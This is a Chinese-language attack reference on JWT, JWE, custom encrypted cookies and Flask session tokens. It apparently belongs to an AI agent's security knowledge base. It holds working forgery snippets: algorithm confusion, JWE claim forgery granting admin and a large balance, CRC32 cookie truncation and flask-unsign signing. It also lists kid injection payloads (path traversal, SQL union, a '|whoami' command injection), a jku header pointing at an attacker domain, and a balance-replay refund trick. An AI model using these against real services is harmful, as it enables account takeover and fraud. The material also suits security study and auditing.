# JWT/JWE Token 攻击专题

> JWT 全攻击面: 算法混淆/头部注入（jwk/jku/kid）/未验签/JWE 公钥伪造/自定义加密 cookie 伪造/token 状态重放。
> 速查级入口见 web-vulnerabilities.md §2.2；Flask session 见 §5 本文末。

---

## §1 算法面（基础）

| 攻击 | 操作 |
|------|------|
| alg:none | header 改 `"alg":"none"`，签名段留空 |
| RS256→HS256 混淆 | 服务端同公钥验两种算法时，用公钥当 HMAC 密钥签名: python 标准库 hmac 模块（import hmac，自带无需安装）——`sig = hmac.new(open("pubkey.pem","rb").read(), (h+"."+p).encode(), hashlib.sha256).digest()`（h/p 为 base64url 的 header.payload，header alg 改 HS256） |
| 弱密钥爆破 | `hashcat -m 16500 jwt.txt wordlist.txt` |

## §2 头部注入面（jwk/jku/kid）

**decode() vs verify()**: 库的 decode() 不验签。服务端只调 decode() 时改 payload 重拼 `parts[0] + new_payload + parts[2]` 即可。审计: 查调用的是 decode 还是 verify。

**jwk 头注入**: 服务端从 token 头内嵌 jwk 取公钥验签 → 自生成 RSA 密钥对、公钥（kty/kid/e/n base64url）嵌入 header、私钥签名。服务端信任 token 自带密钥。

**jku 头注入**: 服务端从 jku URL 拉取 JWKS → JWKS 托管攻击者域（webhook.site），header `jku: https://attacker.com/.well-known/jwks.json`。SSRF+伪造组合。

**kid 注入**（kid 用于选密钥时）:
- 路径穿越 `../../../dev/null` → 空文件 → HMAC 空密钥（签名密钥用空串）
- `/proc/sys/kernel/hostname` → 内容可预测
- SQL 注入 `' UNION SELECT 'known-secret'--`（kid 查库时）
- 命令注入: 后端用 Ruby `open()` 读密钥文件时 kid 传 `/path/to/key|whoami`（管道执行）; PHP `exec`/`system` 读文件同理。利用条件苛刻（要求特定后端读文件方式），审计时看 kid 的消费方式

## §3 JWE 公钥伪造

JWE 是加密非签名——服务端用私钥解密并信任内容时，公开的 RSA 公钥即可加密任意 claims。

识别: token 5 个 base64url 段（header.enckey.iv.ciphertext.tag），JWT 是 3 段。公钥来源: /api/key、/.well-known/jwks.json、页面源码。

```python
from jwcrypto import jwk, jwe
key = jwk.JWK.from_pem(public_key_pem.encode())
token = jwe.JWE(json.dumps({"sub":"attacker","balance":999999,"role":"admin"}).encode(),
    recipient=key, protected=json.dumps({"alg":"RSA-OAEP-256","enc":"A256GCM"}))
forged = token.serialize(compact=True)
```

规则: 加密≠认证。服务端信任"凡能解密的 token"而无签名校验 → 公钥暴露=任意伪造。

## §4 自定义加密 cookie 伪造（长度字段+CRC32）

结构 `AES(key¡value÷...) + <len>(2B) + <CRC32>(4B)`、解析器信 len 与 CRC32:
1. 注册时可控字段内嵌目标: `b"name\xa1attacker\xf7id\xa11\xf7"`
2. 拿加密 cookie 拆出 ct 与尾部
3. 截断到含 `id¡1¡` 处: 新 `len=struct.pack("<H",n)`、新 `CRC32=struct.pack("<I", zlib.crc32(ct[:n]))` 拼接

规则: CRC32/adler32/md5 是校验和不是 MAC（线性，改后重算仍过）。注册可控明文 + 长度前缀 + 非 HMAC/AEAD = 可伪造。

## §5 token 内嵌状态重放与 Flask session

**JWT 余额重放**: 服务端信 token 内 balance 做退款但不核对购买历史 → 保存初始 JWT → 消费到 0 → 换回旧 token → 退货（货款加到旧余额）→ 循环。检测: token 内嵌余额/次数/等级且消费后 token 内容变化。

**Flask session 伪造**: 区分——token 第二段能 base64 解出 JSON 是 JWT；Flask session 是签名不加密 cookie。伪造: `$(dirname $PYTHON_CMD)/flask-unsign --sign --secret 'key' --cookie '{"admin":True}'`; 爆破 `$(dirname $PYTHON_CMD)/flask-unsign --crack --cookie <cookie> --wordlist <dict>`.

**实操**: token 替换后不要反复重放原请求——改 token 后直接请求受保护资源验证（前端页面会读新 token 重渲染）。受保护下载文件可能要修文件头。

## §6 工具

| 工具 | 用途 |
|------|------|
| python 内联（标准库 hmac + $PYTHON_CMD 环境库 pycryptodome） | 算法降级/tamper 均为几行拼装: header.payload 重编码 + hmac/RSA 签名。注意 pycryptodome 是 import 库（`from Crypto...`）非命令行工具——无 CLI 路径，脚本内 import 使用 |
| `$(dirname $PYTHON_CMD)/flask-unsign` | Flask session 解码/爆破/伪造（`--decode/--sign/--crack --wordlist`） |
| hashcat -m 16500 | JWT 弱密钥爆破 |
| jwcrypto | JWE 构造（Python 库） |
| hash_extender / hashpumpy | 哈希长度扩展（见 web-crypto-attacks.md §5） |

## §7 关联文件

- `$AGENT_DIR/knowledge-base/auth-attacks.md` — 认证攻击全景（本文件是其 token 侧深化）
- `$AGENT_DIR/knowledge-base/web-crypto-attacks.md` — 密码学攻击决策表/Padding Oracle 内联/bit-flip/长度扩展
